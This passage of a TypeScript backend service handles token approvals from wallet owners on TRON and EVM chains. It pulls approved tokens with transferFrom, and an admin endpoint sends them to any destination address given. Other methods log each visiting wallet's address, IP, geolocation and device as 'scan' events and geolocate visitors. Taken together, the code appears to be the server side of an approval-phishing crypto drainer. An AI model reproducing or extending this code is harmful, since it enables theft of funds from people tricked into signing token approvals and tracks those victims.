            aggregateType: "CollectionIntent",
            aggregateId: intent.id,
            collectionIntentId: intent.id,
            eventType: "CollectionFailed",
            payload: {
              collectionIntentId: intent.id,
              transferAttemptId: attempt.id,
              error: message,
            },
          },
        }),
      ]);
      this.notifyCollectionIntentUpdated({
        id: intent.id,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.FAILED,
        network: approval.network,
        attemptId: attempt.id,
        txHash: null,
      });
      throw error;
    }
  }

  async confirmCollectionAttempt(attemptId: string): Promise<{
    finalized: boolean;
    retryAfterMs?: number;
  }> {
    const attempt = await prisma.transferAttempt.findUnique({
      where: { id: attemptId },
      include: {
        collectionIntent: { include: { approval: true } },
        transfer: true,
      },
    });
    if (!attempt) throw new NotFoundException("Transfer attempt not found");
    if (attempt.status === TransferAttemptStatus.CONFIRMED)
      return { finalized: true };
    if (!attempt.txHash || !attempt.transfer)
      throw new BadRequestException("Transfer attempt is not broadcast");

    const approval = attempt.collectionIntent.approval;
    if (attempt.collectionIntent.status === CollectionIntentStatus.BROADCAST) {
      await prisma.collectionIntent.update({
        where: { id: attempt.collectionIntentId },
        data: { status: CollectionIntentStatus.CONFIRMING },
      });
      this.notifyCollectionIntentUpdated({
        id: attempt.collectionIntentId,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.CONFIRMING,
        network: approval.network,
        attemptId: attempt.id,
        txHash: attempt.txHash,
      });
    }
    let blockNumber: number | null = null;
    let succeeded = false;
    if (approval.network === "tron") {
      const tron = new TronWeb({ fullHost: TRON_GRID });
      const info = (await tron.trx
        .getTransactionInfo(attempt.txHash)
        .catch(() => null)) as {
        id?: string;
        blockNumber?: number;
        receipt?: { result?: string };
        result?: string;
      } | null;
      if (!info?.id && info?.blockNumber == null) {
        return {
          finalized: false,
          retryAfterMs:
            this.platformConfig.getTransfer().confirmationRetryDelayMs,
        };
      }
      blockNumber = info.blockNumber ?? null;
      succeeded =
        (info.receipt?.result ?? info.result ?? "SUCCESS") === "SUCCESS";
    } else {
      const receipt = (await this.evmRpcCall(
        approval.network as EvmChainKey,
        "eth_getTransactionReceipt",
        [attempt.txHash],
      )) as { status?: string; blockNumber?: string } | null;
      if (!receipt) {
        return {
          finalized: false,
          retryAfterMs:
            this.platformConfig.getTransfer().confirmationRetryDelayMs,
        };
      }
      blockNumber = receipt.blockNumber
        ? Number.parseInt(receipt.blockNumber, 16)
        : null;
      succeeded = receipt.status === "0x1";
    }

    if (!succeeded) {
      await prisma.$transaction([
        prisma.transfer.update({
          where: { id: attempt.transfer.id },
          data: {
            status: "failed",
            errorMessage: "On-chain transferFrom reverted",
          },
        }),
        prisma.transferAttempt.update({
          where: { id: attempt.id },
          data: {
            status: TransferAttemptStatus.FAILED,
            failureCode: "ON_CHAIN_REVERT",
            failureMessage: "On-chain transferFrom reverted",
          },
        }),
        prisma.collectionIntent.update({
          where: { id: attempt.collectionIntentId },
          data: {
            status: CollectionIntentStatus.FAILED,
            lastErrorCode: "ON_CHAIN_REVERT",
            lastErrorMessage: "On-chain transferFrom reverted",
          },
        }),
        prisma.outboxEvent.create({
          data: {
            aggregateType: "CollectionIntent",
            aggregateId: attempt.collectionIntentId,
            collectionIntentId: attempt.collectionIntentId,
            eventType: "CollectionFailed",
            payload: {
              collectionIntentId: attempt.collectionIntentId,
              transferAttemptId: attempt.id,
              reason: "ON_CHAIN_REVERT",
            },
          },
        }),
      ]);
      this.notifyCollectionIntentUpdated({
        id: attempt.collectionIntentId,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: CollectionIntentStatus.FAILED,
        network: approval.network,
        attemptId: attempt.id,
        txHash: attempt.txHash,
      });
      return { finalized: true };
    }

    const progress = applyConfirmedCollection({
      remaining: BigInt(approval.remainingRaw),
      collected: BigInt(approval.collectedRaw),
      transferred: BigInt(attempt.transfer.amountRaw),
      unlimited: approval.unlimited,
    });
    await prisma.$transaction([
      prisma.transfer.update({
        where: { id: attempt.transfer.id },
        data: {
          status: "confirmed",
          blockNumber: blockNumber ?? undefined,
          confirmedAt: new Date(),
          errorMessage: null,
        },
      }),
      prisma.transferAttempt.update({
        where: { id: attempt.id },
        data: {
          status: TransferAttemptStatus.CONFIRMED,
          confirmedAt: new Date(),
          finalityAt: new Date(),
        },
      }),
      prisma.collectionIntent.update({
        where: { id: attempt.collectionIntentId },
        data: {
          status: CollectionIntentStatus.SETTLED,
          settledRaw: attempt.transfer.amountRaw,
          settledAt: new Date(),
        },
      }),
      prisma.approval.update({
        where: { id: approval.id },
        data: {
          remainingRaw: progress.remaining.toString(),
          collectedRaw: progress.collected.toString(),
          status: progress.status,
          collectionEnabled: progress.keepMonitoring,
          nextCheckAt: progress.keepMonitoring
            ? this.nextCollectionCheck()
            : null,
        },
      }),
      prisma.outboxEvent.create({
        data: {
          aggregateType: "CollectionIntent",
          aggregateId: attempt.collectionIntentId,
          collectionIntentId: attempt.collectionIntentId,
          eventType: "CollectionSettled",
          payload: {
            collectionIntentId: attempt.collectionIntentId,
            transferAttemptId: attempt.id,
            txHash: attempt.txHash,
            settledRaw: attempt.transfer.amountRaw,
          },
        },
      }),
    ]);
    this.notifyCollectionIntentUpdated({
      id: attempt.collectionIntentId,
      approvalId: approval.id,
      ownerAddress: approval.ownerAddress,
      status: CollectionIntentStatus.SETTLED,
      network: approval.network,
      attemptId: attempt.id,
      txHash: attempt.txHash,
    });
    return { finalized: true };
  }

  async debugApprovals() {
    const [approvals, audits, transfers] = await Promise.all([
      prisma.approval.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
      prisma.auditLog.findMany({ orderBy: { createdAt: "desc" }, take: 100 }),
      prisma.transfer.findMany({
        orderBy: { createdAt: "desc" },
        take: 100,
        select: {
          id: true,
          approvalId: true,
          escrowIntentId: true,
          idempotencyKey: true,
          amountRaw: true,
          fromAddress: true,
          toAddress: true,
          txHash: true,
          blockNumber: true,
          status: true,
          errorMessage: true,
          payloadKind: true,
          broadcastAt: true,
          confirmedAt: true,
          retryCount: true,
          createdAt: true,
          updatedAt: true,
        },
      }),
    ]);
    return {
      ok: true,
      approvals,
      audits,
      transfers,
      timestamp: new Date().toISOString(),
    };
  }

  async getCollectorStatus() {
    const now = new Date();
    const [approvalCounts, transferCounts, due, leased] = await Promise.all([
      prisma.approval.groupBy({ by: ["status"], _count: { _all: true } }),
      prisma.transfer.groupBy({ by: ["status"], _count: { _all: true } }),
      prisma.approval.count({
        where: {
          collectionEnabled: true,
          status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
          OR: [{ nextCheckAt: null }, { nextCheckAt: { lte: now } }],
        },
      }),
      prisma.approval.count({ where: { leaseUntil: { gt: now } } }),
    ]);
    return {
      ok: true,
      enabled: this.configService.getCollectorConfig().enabled,
      maxRuns: this.configService.getCollectorConfig().maxRuns,
      intervalMs: this.configService.getCollectorConfig().intervalMs,
      due,
      leased,
      approvals: Object.fromEntries(
        approvalCounts.map((row) => [row.status, row._count._all]),
      ),
      transfers: Object.fromEntries(
        transferCounts.map((row) => [row.status, row._count._all]),
      ),
      timestamp: now.toISOString(),
    };
  }
  async captureFlowLog(body: Record<string, unknown>) {
    this.logFlow("FRONTEND FLOW EVENT", body);
    return { ok: true };
  }
  async getApproval(id: string) {
    const approval = await prisma.approval.findUnique({ where: { id } });
    if (!approval) throw new NotFoundException("not_found");
    return { approval };
  }

  async getApprovalForOwner(id: string, ownerAddress: string) {
    const approval = await prisma.approval.findFirst({
      where: {
        id,
        ownerAddress: {
          equals: ownerAddress,
          mode: "insensitive",
        },
      },
    });
    if (!approval) throw new NotFoundException("not_found");
    return { approval };
  }
  async prepareRevoke(body: Record<string, unknown>) {
    const approvalId = String(body.approvalId ?? "").trim();
    const approval = approvalId
      ? await prisma.approval.findUnique({ where: { id: approvalId } })
      : null;
    const network = (approval?.network ?? String(body.network ?? ""))
      .trim()
      .toLowerCase();
    const owner = (approval?.ownerAddress ?? String(body.owner ?? "")).trim();
    const token = this.parseToken(approval?.tokenSymbol ?? body.token);
    return this.prepareApproval({
      network,
      owner,
      token,
      amountHuman: "0",
      unlimited: false,
    });
  }
  async broadcastTron(transaction: Record<string, unknown>) {
    this.logFlow("TRON BROADCAST REQUEST");
    const signature = transaction.signature;
    if (!Array.isArray(signature) || signature.length === 0)
      throw new BadRequestException(
        "Signed transaction is missing signature[]",
      );
    const res = await fetch(`${TRON_GRID}/wallet/broadcasttransaction`, {
      method: "POST",
      headers: this.tronHeaders(),
      body: JSON.stringify(transaction),
      cache: "no-store",
    });
    const json = (await res.json().catch(() => ({}))) as {
      result?: boolean;
      txid?: string;
      message?: string;
      code?: string;
    };
    const decodedMessage = decodeTronNodeMessage(json.message);
    if (!res.ok || json.result !== true || !json.txid) {
      this.logFlow("TRON BROADCAST FAILED", {
        code: json.code ?? null,
        message: decodedMessage ?? null,
      });
      return {
        result: false,
        error: humanizeTronBroadcastError({
          code: json.code ?? null,
          message: decodedMessage,
        }),
        code: json.code ?? null,
        message: decodedMessage ?? null,
        trongrid: json,
      };
    }
    this.logFlow("TRON BROADCAST SUCCESS", { txid: json.txid });
    return { result: true, txid: json.txid, trongrid: json };
  }
  async registerApproved(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const address = String(body.address ?? "").trim();
    if (!network || !address)
      throw new BadRequestException("network and address are required");
    const amountRaw = String(body.amountRaw ?? body.allowance ?? "0");
    const txHash =
      String(body.txid ?? "").trim() ||
      `legacy:${network}:${address.toLowerCase()}`;
    const token = this.parseToken(body.token);
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported network/token");
    const approval = await prisma.approval.upsert({
      where: { network_txHash: { network, txHash } },
      update: {
        status: "ACTIVE",
        amountRaw,
        amountHuman: String(body.amountHuman ?? amountRaw),
        remainingRaw: amountRaw,
        updatedAt: new Date(),
      },
      create: {
        ownerAddress: address,
        spenderAddress: this.spenderFor(network),
        network,
        tokenSymbol: token,
        tokenAddress: tokenInfo.address,
        decimals: tokenInfo.decimals,
        amountRaw,
        amountHuman: String(body.amountHuman ?? amountRaw),
        remainingRaw: amountRaw,
        txHash,
        status: "ACTIVE",
        termsVersion: this.platformConfig.getApproval().termsVersion,
        unlimited: false,
      },
    });
    await this.recordAudit(
      `owner:${address}`,
      "register_legacy",
      "approval",
      { network, txHash },
      approval.id,
    );
    return {
      code: 200,
      status: "success",
      message: "OK",
      data: { registered: true, approvalId: approval.id },
      timestamp: new Date().toISOString(),
    };
  }
  async adminTransfer(body: Record<string, unknown>) {
    const approvalId = String(body.approvalId ?? "").trim();
    const amountRaw = String(body.amountRaw ?? "").trim();
    const idempotencyKey = String(body.idempotencyKey ?? "").trim();
    const toAddress = String(body.toAddress ?? "").trim();
    if (!approvalId || !amountRaw || !idempotencyKey || !toAddress) {
      throw new BadRequestException(
        "approvalId, amountRaw, idempotencyKey, and toAddress are required",
      );
    }
    const existing = await prisma.transfer.findUnique({
      where: { idempotencyKey },
    });
    if (existing?.status === "confirmed" && existing.txHash) {
      const { signedPayload: _signedPayload, ...safeTransfer } = existing;
      return { ok: true, idempotent: true, transfer: safeTransfer };
    }
    const approval = await prisma.approval.findUnique({
      where: { id: approvalId },
    });
    if (!approval) throw new NotFoundException("Approval not found");
    if (approval.status !== "ACTIVE" && approval.status !== "PARTIALLY_USED") {
      throw new BadRequestException(
        `Approval status ${approval.status} cannot transfer`,
      );
    }

    let requested: bigint;
    try {
      requested = BigInt(amountRaw);
    } catch {
      throw new BadRequestException("Invalid amountRaw");
    }
    if (requested <= BigInt(0))
      throw new BadRequestException("amount must be > 0");

    const verified = await this.verifyAllowance({
      network: approval.network,
      owner: approval.ownerAddress,
      spender: approval.spenderAddress,
      token: approval.tokenSymbol,
    });

    try {
      const executed = await this.executeAutoTransfer({
        approval: {
          id: approval.id,
          ownerAddress: approval.ownerAddress,
          spenderAddress: approval.spenderAddress,
          network: approval.network,
          tokenSymbol: approval.tokenSymbol,
          tokenAddress: approval.tokenAddress,
          decimals: approval.decimals,
          remainingRaw: approval.remainingRaw,
          collectedRaw: approval.collectedRaw,
          unlimited: approval.unlimited,
          failureCount: approval.failureCount,
        },
        transferToAddress: toAddress,
        requestedRaw: requested,
        allowanceRaw: BigInt(verified.allowance),
        idempotencyKey,
      });
      return {
        ok: true,
        dryRun: false,
        transfer: {
          id: executed.transferId,
          txHash: executed.txHash,
          amountRaw: executed.transferredRaw,
          blockNumber: executed.blockNumber,
          status: "confirmed",
        },
      };
    } catch (err) {
      const message = getErrorMessage(err);
      if (/no transferable|insufficient/i.test(message)) {
        throw new BadRequestException(
          "Insufficient allowance, balance, or remaining approval",
        );
      }
      throw err;
    }
  }
  legacyTronApprove(body: Record<string, unknown>) {
    return this.prepareApproval({
      network: "tron",
      owner: body.owner,
      token: body.token,
      amountHuman: body.amountHuman,
      unlimited: body.unlimited,
    });
  }
  async consent(body: Record<string, unknown>) {
    const address = String(body.address ?? "").trim();
    const txid = String(body.txid ?? body.txHash ?? body.hash ?? "").trim();
    const ok = Boolean(address && txid);
    await this.recordAudit(
      `owner:${address || "unknown"}`,
      "consent",
      "consent",
      { ...body, ok },
    );
    return { ok, txid };
  }
  async energyDelegate(body: Record<string, unknown>) {
    const address = String(body.address ?? body.owner ?? "").trim();
    if (!address) {
      throw new BadRequestException(
        "body must have required property 'address'",
      );
    }
    this.logFlow("RESOURCE ACQUIRE REQUEST", {
      network: String(body.network ?? ""),
      address,
      purpose: String(body.purpose ?? "approve"),
    });
    // Legacy route name — delegates to chain-agnostic ResourceManager.acquireResources().
    const result = await this.resourceManager.acquireResources(body);
    this.logFlow("RESOURCE ACQUIRE RESPONSE", {
      status: result.status,
      network: result.network,
      provider: result.provider ?? null,
      acquisitionId: result.acquisitionId ?? null,
      retryAfterMs: result.retryAfterMs ?? null,
      message: result.message ?? null,
    });
    return result;
  }

  async verifyResources(body: Record<string, unknown>) {
    const address = String(body.address ?? body.owner ?? "").trim();
    if (!address) {
      throw new BadRequestException(
        "body must have required property 'address'",
      );
    }
    this.logFlow("RESOURCE VERIFY REQUEST", {
      network: String(body.network ?? ""),
      address,
    });
    const result = await this.resourceManager.verifyResources(body);
    this.logFlow("RESOURCE VERIFY RESPONSE", {
      status: result.status,
      network: result.network,
      provider: result.provider ?? null,
      message: result.message ?? null,
    });
    return result;
  }
  async ipgeo(
    headers: Headers | Record<string, string | string[] | undefined>,
  ) {
    try {
      const forwardedFor = this.getHeader(headers, "x-forwarded-for");
      const realIp = this.getHeader(headers, "x-real-ip");
      const headerIp =
        forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
      const local =
        !headerIp ||
        headerIp === "unknown" ||
        headerIp === "127.0.0.1" ||
        headerIp === "::1" ||
        headerIp.startsWith("127.") ||
        headerIp.startsWith("::ffff:127.");
      const url = local
        ? "http://ip-api.com/json/?fields=status,query,country,city,countryCode"
        : `http://ip-api.com/json/${encodeURIComponent(headerIp)}?fields=status,query,country,city,countryCode`;
      const res = await fetch(url, { cache: "no-store" });
      if (!res.ok) return { ip: headerIp, location: "Unknown" };
      const json = (await res.json()) as {
        status?: string;
        query?: string;
        country?: string;
        city?: string;
        countryCode?: string;
      };
      if (json.status !== "success")
        return { ip: headerIp, location: "Unknown" };
      const ip = json.query || headerIp;
      const location =
        json.country && json.city
          ? `${json.country}, ${json.city}`
          : json.country || "Unknown";
      return { ip, location };
    } catch {
      return { ip: "unknown", location: "Unknown" };
    }
  }
  async tgLog(
    body: Record<string, unknown>,
    headers: Headers | Record<string, string | string[] | undefined>,
  ) {
    const address = String(body.address ?? body.tron ?? body.evm ?? "").trim();
    if (!address) throw new BadRequestException("Provide address");
    const userAgent = String(
      body.userAgent || this.getHeader(headers, "user-agent") || "unknown",
    );
    const forwardedFor = this.getHeader(headers, "x-forwarded-for");
    const realIp = this.getHeader(headers, "x-real-ip");
    const fallbackIp =
      forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
    const ip = String(body.ip ?? fallbackIp);
    const location = String(body.location ?? "Unknown");
    const network = String(
      body.network ?? (address.startsWith("T") ? "tron" : "evm"),
    );
    const status = String(body.status ?? "success");
    const eventType = String(body.type ?? body.event ?? "scan");
    const traceId =
      String(
        body.traceId ??
          body.transactionId ??
          this.getHeader(headers, "x-correlation-id") ??
          "",
      ).trim() || null;
    await prisma.tgLogEvent.create({
      data: {
        type: eventType,
        network,
        address,
        status,
        error: errorForLog(body.error),
        ip,
        location,
        site: String(body.site ?? this.getHeader(headers, "host") ?? "unknown"),
        device: /mobi|iphone|android/i.test(userAgent)
          ? "Mobile"
          : /mac|win|linux|cros/i.test(userAgent)
            ? "Desktop"
            : "Other",
        traceId,
      },
    });
    return {
      code: 200,
      status: "success",
      message: "OK",
      data: { sent: false },
      timestamp: new Date().toISOString(),
    };
  }
}
